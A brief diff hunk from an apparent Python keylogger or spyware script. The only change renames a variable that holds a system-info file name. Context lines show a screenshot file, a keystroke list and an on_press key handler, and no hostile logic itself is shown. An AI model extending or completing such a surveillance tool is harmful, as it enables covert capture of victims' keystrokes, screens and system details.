@@ -13,7 +13,7 @@ scrshot = 'screenshot.png'
 count = 0
 keys = []
 ttime = time.time()
-systeminfo = 'systeminfo.txt'
+sysinfo = 'systeminfo.txt'
 currenttime = str(ttime)
 
 def on_press(key) :
